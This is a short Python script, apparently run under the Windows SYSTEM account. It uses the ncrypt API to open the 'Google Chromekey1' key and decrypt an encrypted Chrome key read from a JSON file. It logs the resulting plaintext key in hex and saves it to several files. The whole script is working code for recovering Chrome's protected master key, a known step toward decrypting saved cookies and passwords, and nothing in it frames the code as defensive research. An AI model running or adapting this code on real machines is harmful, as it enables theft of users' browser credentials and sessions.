# SYSTEM上下文: 只做NCrypt解密
import ctypes, json
from ctypes import wintypes
LOG = open(r'D:\ask\ncrypt_only_log.txt', 'w', encoding='utf-8')
def log(m):
    LOG.write(str(m) + '\n'); LOG.flush()
ncrypt = ctypes.windll.ncrypt
ncrypt.NCryptOpenStorageProvider.argtypes = [ctypes.POINTER(wintypes.HANDLE), wintypes.LPCWSTR, wintypes.DWORD]
ncrypt.NCryptOpenKey.argtypes = [wintypes.HANDLE, ctypes.POINTER(wintypes.HANDLE), wintypes.LPCWSTR, wintypes.DWORD, wintypes.DWORD]

parts = json.load(open(r'D:\ask\gcm_parts.json'))
enc_key = bytes.fromhex(parts['enc_key'])

NCRYPT_SILENT_FLAG=0x40
hProv=wintypes.HANDLE(); hKey=wintypes.HANDLE()
st=ncrypt.NCryptOpenStorageProvider(ctypes.byref(hProv),'Microsoft Software Key Storage Provider',0)
log(f'prov {st:08X}')
assert st==0
st=ncrypt.NCryptOpenKey(hProv,ctypes.byref(hKey),'Google Chromekey1',0,0)
log(f'openkey {st:08X}')
assert st==0,f'openkey {st:08X}'
buf=(ctypes.c_ubyte*len(enc_key)).from_buffer_copy(enc_key)
cb=wintypes.DWORD(0)
st=ncrypt.NCryptDecrypt(hKey,buf,len(enc_key),None,None,0,ctypes.byref(cb),NCRYPT_SILENT_FLAG)
if st!=0:
    st=ncrypt.NCryptDecrypt(hKey,buf,len(enc_key),None,None,0,ctypes.byref(cb),0)
log(f'dec1 {st:08X}')
assert st==0
out=(ctypes.c_ubyte*cb.value)()
st=ncrypt.NCryptDecrypt(hKey,buf,len(enc_key),None,out,cb.value,ctypes.byref(cb),NCRYPT_SILENT_FLAG)
if st!=0:
    st=ncrypt.NCryptDecrypt(hKey,buf,len(enc_key),None,out,cb.value,ctypes.byref(cb),0)
assert st==0,f'dec2 {st:08X}'
dk=bytes(out[:cb.value])
log(f'DECRYPTED {len(dk)} {dk.hex()}')
open(r'D:\ask\system_nc_out.bin','wb').write(dk)
json.dump({'decrypted':dk.hex()},open(r'D:\ask\nc_result.json','w'))
